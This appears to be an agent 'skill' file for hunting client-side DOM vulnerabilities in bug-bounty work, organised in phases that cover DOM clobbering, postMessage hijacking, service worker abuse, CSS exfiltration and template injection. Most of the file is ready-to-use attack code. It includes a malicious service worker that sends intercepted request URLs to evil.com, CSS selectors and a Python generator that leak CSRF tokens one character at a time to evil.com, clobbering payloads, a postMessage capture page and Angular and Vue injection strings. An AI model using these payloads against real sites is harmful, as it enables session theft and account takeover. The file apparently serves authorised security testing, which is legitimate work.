---
name: hunt-dom
description: Hunt client-side DOM vulnerabilities — DOM Clobbering (overwrite JS globals via HTML injection), PostMessage hijacking (missing origin check), Service Worker abuse (intercept requests), CSS Injection/Exfiltration (attribute selectors → token char-by-char), Client-side template injection, dangerouslySetInnerHTML. Use when hunting DOM-XSS, client-side auth bypass, or token exfiltration without server-side interaction.
sources: hackerone_public, portswigger_research
report_count: 17
---

# HUNT-DOM — DOM Clobbering / PostMessage / Service Worker / CSS Exfil

## Crown Jewel Targets

DOM-based attacks bypass WAFs entirely — no server-side processing. PostMessage missing origin check = session token theft without XSS filters.

**Highest-value chains:**
- **DOM Clobbering → XSS bypass** — HTML injection (not JS injection) overwrites `window.config` or `document.getElementById` → app executes attacker-controlled value as code
- **PostMessage no origin check → session theft** — `window.addEventListener('message')` without `event.origin` check → inject message from attacker iframe → steal token
- **Service Worker abuse** — register malicious SW on target domain via stored XSS → intercept all future requests → persistent credential theft
- **CSS Exfil** — CSS `input[value^="a"]` selectors → leak CSRF token, session ID, or secret char-by-char with no JS required

---

## Phase 1 — DOM Clobbering

```bash
# Signals: app uses document.getElementById() or window.VARNAME for config
# HTML injection points: user bio, comments, name fields (no script tag needed)

# Test: does the app use element IDs as variables?
# Inject: <a id="config">  or  <img name="token">
# If window.config or document.token is overwritten → clobbering possible

# Payload to overwrite window.config.url
# <a id="config" href="https://evil.com">

# Payload to clobber document.baseURI (affects relative URL resolution)
# <base href="https://evil.com/">

# Payload to clobble window.x.y (nested)
# <form id="x"><input id="y" name="z" value="clobbered"></form>

# Detection script (run in browser console on target)
```

```javascript
// Paste in browser console to detect clobberable globals
const dangerous = ['config','settings','options','appConfig','init','data','user',
  'token','csrf','nonce','baseUrl','apiUrl','debug'];
dangerous.forEach(k => {
  if (window[k] !== undefined) {
    console.log('[CLOBBER CANDIDATE]', k, '=', window[k]);
  }
});
```

```bash
# Check source for getElementById used as code
curl -s https://$TARGET/ | grep -E "document\.getElementById\(['\"][^'\"]+['\"][^)]*\)\.href|\.src|\.textContent|eval\(.*getElementById"
curl -s https://$TARGET/ | grep -E "window\.[a-zA-Z]+\.(url|src|href|token|key)"
```

---

## Phase 2 — PostMessage Hijacking

```bash
# Find postMessage handlers in JS files
grep -r "addEventListener.*message\|postMessage" recon/$TARGET/ --include="*.js" 2>/dev/null | \
  grep -v "event\.origin\|e\.origin\|msg\.origin\|source\.origin"

# Also check inline scripts
curl -s https://$TARGET/ | grep -A5 "addEventListener.*message"
```

```javascript
// Browser console PoC — test if target page accepts messages from any origin
// Open target in one tab, run this in devtools of that tab
window.postMessage({type: 'auth', token: 'ATTACKER_TOKEN', action: 'login'}, '*');
window.postMessage({cmd: 'navigate', url: 'https://evil.com'}, '*');

// Listener test — does page send tokens to parent via postMessage?
// Open target in iframe on attacker.com:
window.addEventListener('message', e => {
  console.log('[MSG FROM TARGET]', e.origin, JSON.stringify(e.data));
  // if token/session visible here → PostMessage leak
});
```

```bash
# PoC HTML — host on attacker.com to capture messages from target iframe
cat > /tmp/postmessage-poc.html << 'EOF'
<html><body>
<iframe id="f" src="https://TARGET/page-with-postmessage" style="display:none"></iframe>
<pre id="out"></pre>
<script>
window.addEventListener('message', function(e) {
  document.getElementById('out').textContent += 
    'origin: ' + e.origin + '\ndata: ' + JSON.stringify(e.data) + '\n---\n';
});
</script>
</body></html>
EOF
```

---

## Phase 3 — Service Worker Abuse

```bash
# Check if target registers a Service Worker
curl -s https://$TARGET/ | grep -i "serviceWorker\|navigator\.serviceWorker"
curl -s https://$TARGET/sw.js 2>/dev/null | head -20
curl -s https://$TARGET/service-worker.js 2>/dev/null | head -20

# Service Worker scope — what paths does it control?
curl -s https://$TARGET/sw.js | grep -i "scope\|fetch\|cache\|intercept"

# If Stored XSS exists, register malicious SW to intercept future requests:
```

```javascript
// Stored XSS payload to register attacker's service worker
navigator.serviceWorker.register('https://evil.com/malicious-sw.js', {scope: '/'})
  .then(r => console.log('SW registered', r));

// malicious-sw.js (hosted on evil.com — same origin requirement means
// this only works if target allows cross-origin SW via headers or
// the XSS is within the same origin)
self.addEventListener('fetch', e => {
  e.respondWith(
    fetch(e.request).then(resp => {
      // Clone and exfil request headers (including credentials)
      fetch('https://evil.com/sw-intercept?' + e.request.url.replace(/\//g,'_'));
      return resp;
    })
  );
});
```

---

## Phase 4 — CSS Injection / Exfiltration

```bash
# CSS injection allows token exfil without JS — bypasses strict CSP
# Prerequisite: user-controlled CSS value (style attribute, custom CSS field)

# Target: CSRF token in hidden input, API key in meta tag, nonce attribute

# Step 1: Confirm CSS injection
# Inject: color: red;  — does the page element turn red?

# Step 2: Exfil CSRF token char by char
# For each char position, one selector sends HTTP request to attacker if it matches
```

```css
/* Host on attacker.com — inject as stylesheet or style attribute */
/* Leaks CSRF token starting with 'a' in first position */
input[name="csrf"][value^="a"] { background: url(https://evil.com/css?c=a); }
input[name="csrf"][value^="b"] { background: url(https://evil.com/css?c=b); }
/* ... repeat for all chars ... */

/* Meta tag exfil */
meta[name="csrf-token"][content^="a"] { background: url(https://evil.com/css?c=a_meta); }
```

```python
# Generate full CSS exfil payload
import string
chars = string.ascii_lowercase + string.digits + string.ascii_uppercase + '-_'
target_attr = 'name="csrf"'
attacker = 'https://evil.com/css'
pos = 0  # character position to leak

payload = ""
for c in chars:
    payload += f'input[{target_attr}][value^="{c}"] {{ background: url({attacker}?p={pos}&c={c}); }}\n'
print(payload)
```

---

## Phase 5 — dangerouslySetInnerHTML Detection

```bash
# Find React apps using dangerouslySetInnerHTML with user content
grep -r "dangerouslySetInnerHTML" recon/$TARGET/ --include="*.js" 2>/dev/null

# In minified bundles
curl -s "https://$TARGET/_next/static/chunks/pages/index.js" | \
  grep -oP 'dangerouslySetInnerHTML.{0,100}'

# Check if user-controlled data flows into it
# Look for: dangerouslySetInnerHTML={{__html: userData}} or similar patterns
```

---

## Phase 6 — Client-Side Template Injection

```bash
# Angular: {{ constructor.constructor('alert(1)')() }}
# Vue 2: {{ $root.constructor.prototype.constructor('alert(1)')() }}
# Mustache/Handlebars: {{ constructor.constructor('alert(1)')() }}

# Grep for template libraries
grep -r "angular\|vue\|handlebars\|mustache\|nunjucks" recon/$TARGET/ --include="*.js" 2>/dev/null | head -5

# Test Angular template injection
curl -s "https://$TARGET/search?q={{7*7}}" | grep "49"
curl -s "https://$TARGET/search?q={{constructor.constructor('alert(1)')()" | grep -i "angular\|error"
```

---

## Chain Table

| DOM finding | Chain to | Impact |
|-------------|----------|--------|
| DOM Clobbering | Window global overwrite → JS logic manipulation | Auth bypass / XSS |
| PostMessage no origin check | Inject auth action from iframe | Session takeover |
| CSS exfil | Leak CSRF token → use for CSRF attack | CSRF exploit chain |
| Service Worker abuse | Intercept all future requests + credentials | Persistent ATO |
| dangerouslySetInnerHTML | Stored XSS via React | XSS → ATO chain |

---

## Tools

```bash
# DOM Invader (Burp Suite) — automated DOM sink detection
# postMessage-tracker (Chrome Extension)
# CSS exfil toolkit: https://github.com/d0nut/mxss/css-exfil
# pp-finder: https://github.com/nicowillis/pp-finder (prototype pollution grep)
```

---

## Validation

✅ DOM Clobbering: HTML injection overwrites app variable, changes behavior
✅ PostMessage: `event.data` contains session token or sensitive data from target
✅ CSS exfil: HTTP request received for each correct token character
✅ SW abuse: service worker registered, fetch events intercepted

**Severity:**
- PostMessage session theft: High/Critical
- DOM Clobbering → XSS: High
- CSS exfil of CSRF token → CSRF: Medium
- Service Worker → persistent credential theft: Critical
